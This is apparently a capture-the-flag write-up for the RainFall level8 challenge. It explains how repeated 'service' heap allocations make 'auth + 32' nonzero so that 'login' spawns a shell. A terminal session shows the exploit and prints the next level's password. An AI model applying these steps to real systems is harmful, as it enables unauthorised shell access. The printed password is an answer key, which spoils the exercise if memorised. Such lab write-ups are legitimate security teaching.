### Brief
The program only contains the `main` function.
There is a buffer of size 128 which is filled with `fgets` function and the correct size.
No buffer overflow can be used here.
The program consist of using `strncmp` on what is copied onto the buffer to perform certain actions

### Exploit
There is not really such thing as an exploit here, you just need to understand what the program actually do.
It copies 128 bytes of the stdin on the buffer.
It performs actions depending what is on the buffer:
- `auth `: allocate the `auth` pointer
- `reset`: free the `auth` pointer
- `service`: dup the buffer onto a `service` pointer
- `login`: open a shell if `auth + 32 != 0` 

The goal is to first allocate the `auth` pointer.
Then use the `service` command to allocate pointer until it overwrite `auth + 32`.
Then use the `login` command.

### Get access
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
# Allocate the `auth` pointer
auth 
0x804a008, (nil) 
# Allocate the `service` pointer
service
0x804a008, 0x804a018 
# `service` address is 0x10 higher that `auth`
service
0x804a008, 0x804a028 
# `service` address is 0x20 higher that `auth`
# So we can use `login`
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```